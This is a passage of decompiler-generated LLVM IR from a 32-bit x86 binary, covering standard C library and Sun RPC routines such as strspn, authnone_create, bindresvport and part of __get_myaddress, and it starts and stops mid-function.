dec_label_pc_80672f8:                             ; preds = %dec_label_pc_8067328, %dec_label_pc_80672f8, %dec_label_pc_80672e5
  %v0_80672fc = phi i32 [ %v0_80672e8, %dec_label_pc_80672e5 ], [ %v1_80672fc, %dec_label_pc_80672f8 ], [ %v1_80672fc, %dec_label_pc_8067328 ]
  %v2_80672fa = inttoptr i32 %v0_80672fc to i32*
  %v3_80672fa = load i32, i32* %v2_80672fa, align 4
  %v4_80672fa = xor i32 %v3_80672fa, %v2_80672f6
  %v1_80672fc = add i32 %v0_80672fc, 4
  store i32 %v1_80672fc, i32* @ecx, align 4
  %v1_80672ff = add i32 %v4_80672fa, 2130640639
  %v1_8067305 = sub i32 -1, %v4_80672fa
  %v2_8067307 = xor i32 %v1_80672ff, %v1_8067305
  %v1_8067309 = and i32 %v2_8067307, -2130640640
  %v2_8067309 = icmp eq i32 %v1_8067309, 0
  br i1 %v2_8067309, label %dec_label_pc_80672f8, label %dec_label_pc_8067310

dec_label_pc_8067310:                             ; preds = %dec_label_pc_80672f8
  %v2_8067310 = inttoptr i32 %v0_80672fc to i8*
  %v3_8067310 = load i8, i8* %v2_8067310, align 1
  %v16_8067310 = icmp eq i8 %v3_8067310, %v4_80672dc
  br i1 %v16_8067310, label %dec_label_pc_8067330, label %dec_label_pc_8067318

dec_label_pc_8067318:                             ; preds = %dec_label_pc_8067310
  %v1_8067318 = add i32 %v0_80672fc, 1
  %v2_8067318 = inttoptr i32 %v1_8067318 to i8*
  %v3_8067318 = load i8, i8* %v2_8067318, align 1
  %v16_8067318 = icmp eq i8 %v3_8067318, %v4_80672dc
  br i1 %v16_8067318, label %dec_label_pc_8067330, label %dec_label_pc_8067320

dec_label_pc_8067320:                             ; preds = %dec_label_pc_8067318
  %v1_8067320 = add i32 %v0_80672fc, 2
  %v2_8067320 = inttoptr i32 %v1_8067320 to i8*
  %v3_8067320 = load i8, i8* %v2_8067320, align 1
  %v16_8067320 = icmp eq i8 %v3_8067320, %v4_80672dc
  br i1 %v16_8067320, label %dec_label_pc_8067330, label %dec_label_pc_8067328

dec_label_pc_8067328:                             ; preds = %dec_label_pc_8067320
  %v1_8067328 = add i32 %v0_80672fc, 3
  %v2_8067328 = inttoptr i32 %v1_8067328 to i8*
  %v3_8067328 = load i8, i8* %v2_8067328, align 1
  %v16_8067328 = icmp eq i8 %v3_8067328, %v4_80672dc
  %v1_806732e = icmp eq i1 %v16_8067328, false
  br i1 %v1_806732e, label %dec_label_pc_80672f8, label %dec_label_pc_8067330

dec_label_pc_8067330:                             ; preds = %dec_label_pc_80672dc, %dec_label_pc_8067328, %dec_label_pc_8067320, %dec_label_pc_8067318, %dec_label_pc_8067310
  %v0_8067332 = phi i32 [ %v1_8067328, %dec_label_pc_8067328 ], [ %v1_8067320, %dec_label_pc_8067320 ], [ %v1_8067318, %dec_label_pc_8067318 ], [ %v0_80672fc, %dec_label_pc_8067310 ], [ %v0_80672e0, %dec_label_pc_80672dc ]
  store i32 %v0_80672d1, i32* @ebx, align 4
  ret i32 %v0_8067332

; uselistorder directives
  uselistorder i32 %v1_80672fc, { 2, 1, 0 }
  uselistorder i32 %v2_80672ef, { 1, 0 }
  uselistorder i32 %v1_80672e0, { 1, 0, 2 }
  uselistorder i8 %v4_80672dc, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v4_80672d6, { 2, 1, 0 }
  uselistorder i32 %v4_80672d2, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8067330, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_80672e5, { 1, 0 }
  uselistorder label %dec_label_pc_80672dc, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_806735631 = load i8, i8* %arg1, align 1
  %v4_806735835 = icmp eq i8 %v2_806735631, 0
  br i1 %v4_806735835, label %dec_label_pc_8067360, label %dec_label_pc_806735c.lr.ph

dec_label_pc_806735c.lr.ph:                       ; preds = %entry
  %v3_806735632 = zext i8 %v2_806735631 to i32
  %v4_8067356.pre = load i32, i32* @eax, align 4
  %v5_806735633 = and i32 %v4_8067356.pre, -256
  %v6_806735634 = or i32 %v3_806735632, %v5_806735633
  %v4_806733d = ptrtoint i8* %arg1 to i32
  %v1_806734818 = inttoptr i32 %arg2 to i8*
  %v4_8067348.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_806735c

dec_label_pc_8067343:                             ; preds = %dec_label_pc_806735c, %dec_label_pc_8067347
  %v6_806734828 = phi i32 [ %v6_8067348, %dec_label_pc_8067347 ], [ %v6_806734822, %dec_label_pc_806735c ]
  %v2_806734827 = phi i8 [ %v2_8067348, %dec_label_pc_8067347 ], [ %v2_806734819, %dec_label_pc_806735c ]
  %v0_806734726 = phi i32 [ %v1_8067347, %dec_label_pc_8067347 ], [ %arg2, %dec_label_pc_806735c ]
  %v15_8067343 = icmp eq i8 %v2_806735639, %v2_806734827
  br i1 %v15_8067343, label %dec_label_pc_8067350, label %dec_label_pc_8067347

dec_label_pc_8067347:                             ; preds = %dec_label_pc_8067343
  %v1_8067347 = add i32 %v0_806734726, 1
  %v1_8067348 = inttoptr i32 %v1_8067347 to i8*
  %v2_8067348 = load i8, i8* %v1_8067348, align 1
  %v3_8067348 = zext i8 %v2_8067348 to i32
  %v5_8067348 = and i32 %v6_806734828, -256
  %v6_8067348 = or i32 %v3_8067348, %v5_8067348
  store i32 %v6_8067348, i32* @ecx, align 4
  %v4_806734a = icmp eq i8 %v2_8067348, 0
  %v1_806734c = icmp eq i1 %v4_806734a, false
  br i1 %v1_806734c, label %dec_label_pc_8067343, label %dec_label_pc_8067360

dec_label_pc_8067350:                             ; preds = %dec_label_pc_8067343
  %v1_8067354 = add i32 %v0_806736137, 1
  %v1_8067355 = add i32 %v0_806735538, 1
  %v1_8067356 = inttoptr i32 %v1_8067355 to i8*
  %v2_8067356 = load i8, i8* %v1_8067356, align 1
  %v3_8067356 = zext i8 %v2_8067356 to i32
  %v5_8067356 = and i32 %v6_806735640, -256
  %v6_8067356 = or i32 %v3_8067356, %v5_8067356
  %v4_8067358 = icmp eq i8 %v2_8067356, 0
  br i1 %v4_8067358, label %dec_label_pc_8067360, label %dec_label_pc_806735c

dec_label_pc_806735c:                             ; preds = %dec_label_pc_806735c.lr.ph, %dec_label_pc_8067350
  %v4_8067348.pre = phi i32 [ %v4_8067348.pre.pre, %dec_label_pc_806735c.lr.ph ], [ %v6_806734828, %dec_label_pc_8067350 ]
  %v6_806735640 = phi i32 [ %v6_806735634, %dec_label_pc_806735c.lr.ph ], [ %v6_8067356, %dec_label_pc_8067350 ]
  %v2_806735639 = phi i8 [ %v2_806735631, %dec_label_pc_806735c.lr.ph ], [ %v2_8067356, %dec_label_pc_8067350 ]
  %v0_806735538 = phi i32 [ %v4_806733d, %dec_label_pc_806735c.lr.ph ], [ %v1_8067355, %dec_label_pc_8067350 ]
  %v0_806736137 = phi i32 [ 0, %dec_label_pc_806735c.lr.ph ], [ %v1_8067354, %dec_label_pc_8067350 ]
  %v2_806734819 = load i8, i8* %v1_806734818, align 1
  %v3_806734820 = zext i8 %v2_806734819 to i32
  %v5_806734821 = and i32 %v4_8067348.pre, -256
  %v6_806734822 = or i32 %v3_806734820, %v5_806734821
  store i32 %v6_806734822, i32* @ecx, align 4
  %v4_806734a23 = icmp eq i8 %v2_806734819, 0
  %v1_806734c25 = icmp eq i1 %v4_806734a23, false
  br i1 %v1_806734c25, label %dec_label_pc_8067343, label %dec_label_pc_8067360

dec_label_pc_8067360:                             ; preds = %entry, %dec_label_pc_8067350, %dec_label_pc_806735c, %dec_label_pc_8067347
  %v0_806736117 = phi i32 [ %v0_806736137, %dec_label_pc_8067347 ], [ %v0_806736137, %dec_label_pc_806735c ], [ 0, %entry ], [ %v1_8067354, %dec_label_pc_8067350 ]
  ret i32 %v0_806736117

; uselistorder directives
  uselistorder i32 %v6_806734822, { 1, 0 }
  uselistorder i8 %v2_806734819, { 1, 2, 0 }
  uselistorder i32 %v1_8067355, { 1, 0 }
  uselistorder i32 %v6_8067348, { 1, 0 }
  uselistorder i8 %v2_8067348, { 1, 2, 0 }
  uselistorder i32 %v1_8067347, { 1, 0 }
  uselistorder i8 %v2_806735631, { 0, 2, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8067360, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_806735c, { 1, 0 }
}

define i32 @authnone_create() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %v0_80673ec = load i32, i32* @ebx, align 4
  %v1_80673f0 = call i32 @__rpc_thread_variables(i32 %v0_80673ec)
  store i32 %v1_80673f0, i32* %eax.global-to-local, align 4
  %v1_80673f5 = add i32 %v1_80673f0, 152
  %v2_80673f5 = inttoptr i32 %v1_80673f5 to i32*
  %v3_80673f5 = load i32, i32* %v2_80673f5, align 4
  store i32 %v3_80673f5, i32* @esi, align 4
  store i32 %v1_80673f0, i32* @ebx, align 4
  %v1_80673fd = icmp eq i32 %v3_80673f5, 0
  %v1_80673ff = icmp eq i1 %v1_80673fd, false
  br i1 %v1_80673ff, label %dec_label_pc_806741d, label %dec_label_pc_8067401

dec_label_pc_8067401:                             ; preds = %entry
  %v3_8067407 = call i32 @calloc(i64 1, i32 64)
  store i32 %v3_8067407, i32* @esi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8067413 = icmp eq i32 %v3_8067407, 0
  br i1 %v1_8067413, label %dec_label_pc_8067492, label %dec_label_pc_8067417

dec_label_pc_8067417:                             ; preds = %dec_label_pc_8067401
  %v1_8067417 = load i32, i32* @ebx, align 4
  %v2_8067417 = add i32 %v1_8067417, 152
  %v3_8067417 = inttoptr i32 %v2_8067417 to i32*
  store i32 %v3_8067407, i32* %v3_8067417, align 4
  %v0_806741d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_806741d

dec_label_pc_806741d:                             ; preds = %entry, %dec_label_pc_8067417
  %v0_8067426 = phi i32 [ %v3_80673f5, %entry ], [ %v0_806741d.pre, %dec_label_pc_8067417 ]
  %v1_806741d = add i32 %v0_8067426, 60
  %v2_806741d = inttoptr i32 %v1_806741d to i32*
  %v3_806741d = load i32, i32* %v2_806741d, align 4
  %v4_806741d = icmp eq i32 %v3_806741d, 0
  %v1_8067421 = icmp eq i1 %v4_806741d, false
  br i1 %v1_8067421, label %dec_label_pc_806741d.dec_label_pc_8067490_crit_edge, label %dec_label_pc_8067423

dec_label_pc_806741d.dec_label_pc_8067490_crit_edge: ; preds = %dec_label_pc_806741d
  br label %dec_label_pc_8067490

dec_label_pc_8067423:                             ; preds = %dec_label_pc_806741d
  %v1_8067426 = add i32 %v0_8067426, 12
  store i32 %v1_8067426, i32* @ebx, align 4
  %v3_806742f = inttoptr i32 %v1_8067426 to i16*
  %v4_806742f = call i32 @memcpy(i16* %v3_806742f, i32 ptrtoint (i32* @global_var_807f520.815 to i32), i32 12)
  store i32 %v4_806742f, i32* %eax.global-to-local, align 4
  %v0_8067439 = load i32, i32* @ebx, align 4
  %v0_806743a = load i32, i32* @esi, align 4
  %v3_806743b = inttoptr i32 %v0_806743a to i16*
  %v4_806743b = call i32 @memcpy(i16* %v3_806743b, i32 %v0_8067439, i32 12)
  %v0_8067440 = load i32, i32* @esi, align 4
  %v1_8067440 = add i32 %v0_8067440, 40
  store i32 %v1_8067440, i32* %eax.global-to-local, align 4
  %v1_8067443 = add i32 %v0_8067440, 32
  %v2_8067443 = inttoptr i32 %v1_8067443 to i32*
  store i32 ptrtoint (i32* @global_var_806f5a4.860 to i32), i32* %v2_8067443, align 4
  %v0_806744e = load i32, i32* %eax.global-to-local, align 4
  %v2_806744f = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_806744f, i32* @edi, align 4
  %v5_8067454 = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-36, i32 %v0_806744e, i32 20, i32 0)
  store i32 %v5_8067454, i32* %eax.global-to-local, align 4
  %v0_806745c = load i32, i32* @esi, align 4
  %v2_806745e = call i32 @xdr_opaque_auth(i32 %v2_806744f, i32 %v0_806745c)
  store i32 %v0_806745c, i32* %eax.global-to-local, align 4
  %v0_8067465 = load i32, i32* @ebx, align 4
  %v2_8067467 = call i32 @xdr_opaque_auth(i32 %v2_806744f, i32 %v0_8067465)
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v5_8067473 = add i32 %tmp, 16
  %v6_8067473 = inttoptr i32 %v5_8067473 to i32*
  %v7_8067473 = load i32, i32* %v6_8067473, align 4
  call void @__pseudo_call(i32 %v7_8067473)
  %v1_8067476 = load i32, i32* @esi, align 4
  %v2_8067476 = add i32 %v1_8067476, 60
  %v3_8067476 = inttoptr i32 %v2_8067476 to i32*
  store i32 %tmp, i32* %v3_8067476, align 4
  %v3_8067479 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_8067479, i32* %eax.global-to-local, align 4
  %v1_8067480 = add i32 %v3_8067479, 28
  %v2_8067480 = inttoptr i32 %v1_8067480 to i32*
  %v3_8067480 = load i32, i32* %v2_8067480, align 4
  store i32 %v3_8067480, i32* %eax.global-to-local, align 4
  %v1_8067483 = icmp eq i32 %v3_8067480, 0
  br i1 %v1_8067483, label %dec_label_pc_8067490, label %dec_label_pc_8067487

dec_label_pc_8067487:                             ; preds = %dec_label_pc_8067423
  call void @__pseudo_call(i32 %v3_8067480)
  br label %dec_label_pc_8067490

dec_label_pc_8067490:                             ; preds = %dec_label_pc_806741d.dec_label_pc_8067490_crit_edge, %dec_label_pc_8067423, %dec_label_pc_8067487
  %v0_8067490 = load i32, i32* @esi, align 4
  store i32 %v0_8067490, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8067492

dec_label_pc_8067492:                             ; preds = %dec_label_pc_8067401, %dec_label_pc_8067490
  %v0_8067498 = phi i32 [ 0, %dec_label_pc_8067401 ], [ %v0_8067490, %dec_label_pc_8067490 ]
  ret i32 %v0_8067498

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 1, 0, 2 }
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @xdr_opaque_auth, { 1, 0 }
  uselistorder i32 60, { 7, 8, 4, 5, 0, 6, 9, 3, 2, 1, 13, 11, 12, 10, 14, 15, 16 }
  uselistorder i32 (i64, i32)* @calloc, { 1, 2, 0 }
  uselistorder i32 64, { 4, 2, 8, 7, 6, 1, 3, 0, 9, 10, 11, 14, 12, 13, 5 }
  uselistorder i64 1, { 1, 2, 0, 3 }
  uselistorder i32 152, { 3, 4, 1, 0, 2, 5, 6 }
  uselistorder i32 (i32)* @__rpc_thread_variables, { 5, 1, 3, 2, 0, 4 }
  uselistorder label %dec_label_pc_8067492, { 1, 0 }
  uselistorder label %dec_label_pc_8067490, { 2, 1, 0 }
  uselistorder label %dec_label_pc_806741d, { 1, 0 }
}

define i32 @__GI_bindresvport(i32 %arg1, i16* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp8, i32* %stack_var_-32, align 4
  %v0_8067523 = load i32, i32* @ebx, align 4
  %v4_8067527 = ptrtoint i16* %arg2 to i32
  store i32 %v4_8067527, i32* @ebx, align 4
  %v1_806752f = icmp eq i16* %arg2, null
  %v1_8067531 = icmp eq i1 %v1_806752f, false
  br i1 %v1_8067531, label %dec_label_pc_806754e, label %dec_label_pc_8067533

dec_label_pc_8067533:                             ; preds = %entry
  %v2_8067538 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8067538, i32* @ebx, align 4
  %v4_806753d = bitcast i32* %stack_var_-32 to i8*
  %v5_806753d = call i32 @__GI_memset(i8* %v4_806753d, i32 0, i32 16)
  store i32 %v5_806753d, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-32, align 4
  br label %dec_label_pc_8067567

dec_label_pc_806754e:                             ; preds = %entry
  %v2_806754e = load i16, i16* %arg2, align 2
  %v11_806754e = icmp eq i16 %v2_806754e, 2
  br i1 %v11_806754e, label %dec_label_pc_8067567, label %dec_label_pc_8067554

dec_label_pc_8067554:                             ; preds = %dec_label_pc_806754e
  %v1_8067554 = call i32 @__errno_location(i32 %v0_8067523)
  %v1_8067559 = inttoptr i32 %v1_8067554 to i32*
  store i32 96, i32* %v1_8067559, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80675ed

dec_label_pc_8067567:                             ; preds = %dec_label_pc_806754e, %dec_label_pc_8067533
  %v0_8067571 = phi i32 [ %tmp8, %dec_label_pc_806754e ], [ 2, %dec_label_pc_8067533 ]
  %v0_8067567 = load i16, i16* @global_var_807da48.861, align 8
  %v1_8067567 = icmp eq i16 %v0_8067567, 0
  %v1_806756f = icmp eq i1 %v1_8067567, false
  br i1 %v1_806756f, label %dec_label_pc_806758d, label %dec_label_pc_8067571

dec_label_pc_8067571:                             ; preds = %dec_label_pc_8067567
  %v1_8067571 = call i32 @__libc_getpid(i32 %v0_8067571)
  %v2_8067571 = sext i32 %v1_8067571 to i64
  %v2_806757d = ashr i32 %v1_8067571, 31
  %v5_806757e = zext i32 %v2_806757d to i64
  %v6_806757e = mul nuw i64 %v5_806757e, 4294967296
  %v7_806757e = or i64 %v6_806757e, %v2_8067571
  %v9_806757e = sdiv i64 %v7_806757e, 424
  %v10_806757e = trunc i64 %v9_806757e to i32
  store i32 %v10_806757e, i32* %eax.global-to-local, align 4
  %v11_806757e = srem i64 %v7_806757e, 424
  %v12_806757e = trunc i64 %v11_806757e to i32
  %v1_8067580 = add i32 %v12_806757e, 600
  store i32 %v1_8067580, i32* %edx.global-to-local, align 4
  %v1_8067586 = trunc i32 %v1_8067580 to i16
  store i16 %v1_8067586, i16* @global_var_807da48.861, align 8
  %v0_806758d.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_806758d

dec_label_pc_806758d:                             ; preds = %dec_label_pc_8067567, %dec_label_pc_8067571
  %v0_806758d = phi i32 [ %v0_8067571, %dec_label_pc_8067567 ], [ %v0_806758d.pre, %dec_label_pc_8067571 ]
  %v1_806758d = call i32 @__errno_location(i32 %v0_806758d)
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 %v1_806758d, i32* %edi.global-to-local, align 4
  %v1_8067596 = inttoptr i32 %v1_806758d to i32*
  store i32 98, i32* %v1_8067596, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_80675dc17 = load i32, i32* %esi.global-to-local, align 4
  %v1_80675dc18 = add i32 %v0_80675dc17, -423
  %v6_80675dc19 = sub i32 422, %v0_80675dc17
  %v7_80675dc20 = and i32 %v6_80675dc19, %v0_80675dc17
  %v8_80675dc21 = icmp slt i32 %v7_80675dc20, 0
  %v9_80675dc22 = icmp eq i32 %v1_80675dc18, 0
  %v10_80675dc23 = icmp slt i32 %v1_80675dc18, 0
  %v3_80675e224 = icmp eq i1 %v10_80675dc23, %v8_80675dc21
  %v4_80675e225 = icmp eq i1 %v9_80675dc22, false
  %v5_80675e226 = and i1 %v4_80675e225, %v3_80675e224
  br i1 %v5_80675e226, label %dec_label_pc_80675ed, label %dec_label_pc_80675e4

dec_label_pc_80675a1:                             ; preds = %dec_label_pc_80675e8
  %v0_80675a1 = load i16, i16* @global_var_807da48.861, align 8
  store i32 ashr (i32 shl (i32 ptrtoint (i8* @global_var_807da49.862 to i32), i32 16), i32 16), i32* %edx.global-to-local, align 4
  %v2_80675af = call i16 @llvm.bswap.i16(i16 %v0_80675a1)
  %v3_80675af = zext i16 %v2_80675af to i32
  store i32 %v3_80675af, i32* %eax.global-to-local, align 4
  %v2_80675b8 = load i32, i32* @ebx, align 4
  %v3_80675b8 = add i32 %v2_80675b8, 2
  %v4_80675b8 = inttoptr i32 %v3_80675b8 to i16*
  store i16 %v2_80675af, i16* %v4_80675b8, align 2
  %v0_80675bc = load i32, i32* %edx.global-to-local, align 4
  %v1_80675bc = trunc i32 %v0_80675bc to i16
  %.v1_80675bc = select i1 icmp sgt (i16 trunc (i32 ashr (i32 shl (i32 ptrtoint (i8* @global_var_807da49.862 to i32), i32 16), i32 16) to i16), i16 1023), i16 600, i16 %v1_80675bc
  store i16 %.v1_80675bc, i16* @global_var_807da48.861, align 8
  %v0_80675ce = load i32, i32* %eax.global-to-local, align 4
  %v0_80675cf = load i32, i32* %esi.global-to-local, align 4
  %v1_80675cf = add i32 %v0_80675cf, 1
  store i32 %v1_80675cf, i32* %esi.global-to-local, align 4
  %v0_80675d2 = load i32, i32* @ebx, align 4
  %v4_80675d4 = call i32 @bind(i32 %v0_80675d2, i32 16, i32 %v0_80675ce)
  store i32 %v4_80675d4, i32* %eax.global-to-local, align 4
  %v1_80675dc = add i32 %v0_80675cf, -422
  %v6_80675dc = sub i32 421, %v0_80675cf
  %v7_80675dc = and i32 %v6_80675dc, %v1_80675cf
  %v8_80675dc = icmp slt i32 %v7_80675dc, 0
  %v9_80675dc = icmp eq i32 %v1_80675dc, 0
  %v10_80675dc = icmp slt i32 %v1_80675dc, 0
  %v3_80675e2 = icmp eq i1 %v10_80675dc, %v8_80675dc
  %v4_80675e2 = icmp eq i1 %v9_80675dc, false
  %v5_80675e2 = and i1 %v4_80675e2, %v3_80675e2
  br i1 %v5_80675e2, label %dec_label_pc_80675ed, label %dec_label_pc_80675e4

dec_label_pc_80675e4:                             ; preds = %dec_label_pc_806758d, %dec_label_pc_80675a1
  %v0_80675e427 = phi i32 [ %v4_80675d4, %dec_label_pc_80675a1 ], [ -1, %dec_label_pc_806758d ]
  %v2_80675e4 = icmp slt i32 %v0_80675e427, 0
  %v1_80675e6 = icmp eq i1 %v2_80675e4, false
  br i1 %v1_80675e6, label %dec_label_pc_80675ed, label %dec_label_pc_80675e8

dec_label_pc_80675e8:                             ; preds = %dec_label_pc_80675e4
  %v0_80675e8 = load i32, i32* %edi.global-to-local, align 4
  %v1_80675e8 = inttoptr i32 %v0_80675e8 to i32*
  %v2_80675e8 = load i32, i32* %v1_80675e8, align 4
  %v11_80675e8 = icmp eq i32 %v2_80675e8, 98
  br i1 %v11_80675e8, label %dec_label_pc_80675a1, label %dec_label_pc_80675ed

dec_label_pc_80675ed:                             ; preds = %dec_label_pc_806758d, %dec_label_pc_80675a1, %dec_label_pc_80675e4, %dec_label_pc_80675e8, %dec_label_pc_8067554
  %v0_80675f4 = phi i32 [ -1, %dec_label_pc_8067554 ], [ -1, %dec_label_pc_806758d ], [ %v4_80675d4, %dec_label_pc_80675a1 ], [ %v0_80675e427, %dec_label_pc_80675e4 ], [ %v0_80675e427, %dec_label_pc_80675e8 ]
  store i32 %v0_8067523, i32* @ebx, align 4
  ret i32 %v0_80675f4

; uselistorder directives
  uselistorder i32 %v1_80675dc, { 1, 0 }
  uselistorder i32 %v1_806758d, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 0, 3, 1, 4, 2 }
  uselistorder i32 98, { 0, 2, 1 }
  uselistorder i64 424, { 1, 0 }
  uselistorder i32 31, { 19, 21, 16, 17, 22, 23, 12, 2, 3, 0, 1, 18, 6, 7, 4, 5, 13, 24, 25, 20, 9, 8, 10, 11, 14, 15 }
  uselistorder i32 (i32)* @__libc_getpid, { 1, 2, 3, 0 }
  uselistorder i16* @global_var_807da48.861, { 3, 2, 1, 0 }
  uselistorder i32 96, { 1, 2, 0 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 5, 3, 4, 6, 1, 9, 8, 2, 10, 7, 0 }
  uselistorder i16* null, { 1, 0, 2 }
  uselistorder i16* %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80675ed, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_80675e4, { 1, 0 }
  uselistorder label %dec_label_pc_806758d, { 1, 0 }
}

define i32 @__get_myaddress(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i16 @__decompiler_undefined_function_3()
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80675f8 = load i32, i32* @ebp, align 4
  %v0_80675f9 = load i32, i32* @edi, align 4
  %v0_80675fa = load i32, i32* @esi, align 4
  %v0_80675fb = load i32, i32* @ebx, align 4
  store i32 %v0_80675fb, i32* %stack_var_-16, align 4
  %v0_8067602 = load i32, i32* @eax, align 4
  %v4_806760c = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_8067614 = icmp slt i32 %v4_806760c, 0
  store i32 %v4_806760c, i32* @ebp, align 4
  %v1_8067618 = icmp eq i1 %v2_8067614, false
  br i1 %v1_8067618, label %dec_label_pc_8067624, label %dec_label_pc_806761a

dec_label_pc_806761a:                             ; preds = %entry
  br label %dec_label_pc_8067665

dec_label_pc_8067624:                             ; preds = %entry
  %v2_8067624 = ptrtoint i32* %stack_var_-4152 to i32
  %v2_806762f = ptrtoint i32* %stack_var_-24 to i32
  store i32 4096, i32* %stack_var_-24, align 4
  %v0_8067641 = load i32, i32* @ebx, align 4
  %v3_8067649 = call i32 @ioctl(i32 35090, i32 %v2_806762f, i32 %v0_8067641)
  %v2_8067659 = icmp slt i32 %v3_8067649, 0
  %v1_806765b = icmp eq i1 %v2_8067659, false
  br i1 %v1_806765b, label %dec_label_pc_8067676.preheader, label %dec_label_pc_806765d

dec_label_pc_806765d:                             ; preds = %dec_label_pc_8067624
  br label %dec_label_pc_8067665

dec_label_pc_8067665:                             ; preds = %dec_label_pc_80676ad, %dec_label_pc_806761a, %dec_label_pc_806765d
  %stack_var_-4164.0 = phi i32 [ %stack_var_-4164.1, %dec_label_pc_80676ad ], [ 1, %dec_label_pc_806765d ], [ %tmp18, %dec_label_pc_806761a ]
  %stack_var_-20.0 = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_80676ad ], [ %v2_8067624, %dec_label_pc_806765d ], [ %tmp19, %dec_label_pc_806761a ]
  %v0_8067665 = phi i8* [ getelementptr inbounds ([23 x i8], [23 x i8]* @global_var_806f605.865, i32 0, i32 0), %dec_label_pc_80676ad ], [ getelementptr inbounds ([53 x i8], [53 x i8]* @global_var_806f5d0.864, i32 0, i32 0), %dec_label_pc_806765d ], [ getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_806f5b8.863, i32 0, i32 0), %dec_label_pc_806761a ]
  %v3_8067665 = call i32 @perror(i8* nonnull %v0_8067665)
  %v2_8067671 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_8067676.preheader

dec_label_pc_8067676.preheader:                   ; preds = %dec_label_pc_8067665, %dec_label_pc_8067624
  %stack_var_-4164.1.ph = phi i32 [ %stack_var_-4164.0, %dec_label_pc_8067665 ], [ 1, %dec_label_pc_8067624 ]
  %stack_var_-20.1.ph = phi i32 [ %stack_var_-20.0, %dec_label_pc_8067665 ], [ %v2_8067624, %dec_label_pc_8067624 ]
  %v2_8067686 = ptrtoint i32* %stack_var_-56 to i32
  %tmp35 = bitcast i32* %stack_var_-56 to i16*
  %v2_80676bf = urem i16 %tmp, 2
  %v3_80676bf = icmp eq i16 %v2_80676bf, 0
  %v2_80676ca = and i16 %tmp, 8
  %v3_80676ca = icmp eq i16 %v2_80676ca, 0
  %v1_80676cc = icmp eq i1 %v3_80676ca, false
  br label %dec_label_pc_8067676

dec_label_pc_8067676:                             ; preds = %dec_label_pc_8067676.preheader, %dec_label_pc_806770c
  %stack_var_-4164.1 = phi i32 [ 0, %dec_label_pc_806770c ], [ %stack_var_-4164.1.ph, %dec_label_pc_8067676.preheader ]
  store i32 %stack_var_-20.1.ph, i32* @esi, align 4
  %v3_806767d = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_806767d, i32* @edi, align 4
  %v1_80677045 = icmp eq i32 %v3_806767d, 0
  %v1_806770612 = icmp eq i1 %v1_80677045, false
  br i1 %v1_806770612, label %dec_label_pc_8067686.lr.ph, label %dec_label_pc_806770c

dec_label_pc_8067686.lr.ph:                       ; preds = %dec_label_pc_8067676
  %v4_80676ce = icmp eq i32 %stack_var_-4164.1, 0
  %v1_80676d3 = icmp eq i1 %v4_80676ce, false
  br label %dec_label_pc_8067686

dec_label_pc_8067686:                             ; preds = %dec_label_pc_8067686.lr.ph, %dec_label_pc_80676fe
  %v0_8067690 = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_8067686.lr.ph ], [ %v1_80676fe, %dec_label_pc_80676fe ]
  store i32 %v2_8067686, i32* @ebx, align 4
  %v0_806768d = load i32, i32* @ecx, align 4
  %v5_8067692 = call i32 @memcpy(i16* %tmp35, i32 %v0_8067690, i32 32)
  %v3_80676a1 = call i32 @ioctl(i32 35091, i32 %v2_8067686, i32 %v0_806768d)
  %v2_80676a9 = icmp slt i32 %v3_80676a1, 0
  %v1_80676ab = icmp eq i1 %v2_80676a9, false
  br i1 %v1_80676ab, label %dec_label_pc_80676b7, label %dec_label_pc_80676ad

dec_label_pc_80676ad:                             ; preds = %dec_label_pc_8067686
  br label %dec_label_pc_8067665

dec_label_pc_80676b7:                             ; preds = %dec_label_pc_8067686
  %v0_80676fe.pre = load i32, i32* @esi, align 4
  br i1 %v3_80676bf, label %dec_label_pc_80676fe, label %dec_label_pc_80676c3

